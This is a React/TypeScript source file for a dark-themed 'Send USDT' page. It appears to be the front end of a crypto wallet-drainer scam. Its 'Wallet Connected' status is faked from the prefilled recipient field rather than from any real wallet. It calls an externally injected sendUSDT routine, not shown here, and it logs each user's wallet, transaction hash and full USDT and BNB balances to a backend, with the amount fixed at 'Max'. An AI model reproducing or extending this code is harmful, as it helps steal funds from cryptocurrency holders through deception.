import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on: (event: string, callback: (...args: unknown[]) => void) => void;
      removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
    };
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [walletConnected, setWalletConnected] = useState(false);
  const [userWallet, setUserWallet] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) {
      setToAddress(addressParam);
    }
  }, [searchParams]);

  // Listen for wallet connection
  useEffect(() => {
    const checkConnection = () => {
      const addr = (document.getElementById("toAddress") as HTMLInputElement)?.value;
      if (addr && addr.startsWith("0x") && addr.length === 42) {
        setWalletConnected(true);
        setUserWallet(addr);
      }
    };

    // Check immediately
    checkConnection();

    // Check periodically
    const interval = setInterval(checkConnection, 500);

    return () => clearInterval(interval);
  }, [toAddress]);

  useEffect(() => {
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " BNB",
      }).catch(console.error);
    };

    return () => {
      delete window.saveTransaction;
    };
  }, [createTransaction]);

  async function handleSendUSDT() {
    if (!window.sendUSDT) return;
    await window.sendUSDT();
  }

  function setMax() {
    setAmount("Max");
  }

  return (
    <div
      style={{
        margin: 0,
        background: "#0b0b0b",
        color: "#fff",
        fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
        minHeight: "100vh",
      }}
    >
      {/* Connection Status */}
      {walletConnected && (
        <div
          style={{
            background: "linear-gradient(90deg, #1f8f5f 0%, #25d695 100%)",
            padding: "12px 20px",
            display: "flex",
            alignItems: "center",
            gap: "8px",
            fontSize: "14px",
            fontWeight: 500,
          }}
        >
          <div
            style={{
              width: "8px",
              height: "8px",
              borderRadius: "50%",
              background: "#fff",
              animation: "pulse 2s infinite",
            }}
          />
          <span>Wallet Connected: {userWallet.slice(0, 6)}...{userWallet.slice(-4)}</span>
        </div>
      )}

      <div style={{ padding: "20px" }}>
        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Address or Domain Name
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
          }}
        >
          <input
            id="toAddress"
            value={toAddress}
            onChange={(e) => setToAddress(e.target.value)}
            placeholder="0x..."
            style={{
              width: "100%",
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
            }}
          />
        </div>

        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Amount
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <input
            id="amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.0"
            style={{
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
              flex: 1,
            }}
          />
          <div>
            <span style={{ color: "#25d695", fontWeight: 600 }}>USDT</span>
            &nbsp;&nbsp;
            <span
              onClick={setMax}
              style={{
                color: "#25d695",
                fontSize: "14px",
                cursor: "pointer",
              }}
            >
              Max
            </span>
          </div>
        </div>
      </div>

      <button
        onClick={handleSendUSDT}
        style={{
          position: "fixed",
          bottom: "20px",
          left: "20px",
          right: "20px",
          background: walletConnected ? "#1f8f5f" : "#555",
          color: walletConnected ? "#000" : "#999",
          border: "none",
          borderRadius: "14px",
          padding: "16px",
          fontSize: "18px",
          fontWeight: 600,
          cursor: walletConnected ? "pointer" : "not-allowed",
        }}
      >
        {walletConnected ? "Send" : "Connecting Wallet..."}
      </button>

      <style>{`
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      `}</style>
    </div>
  );
}
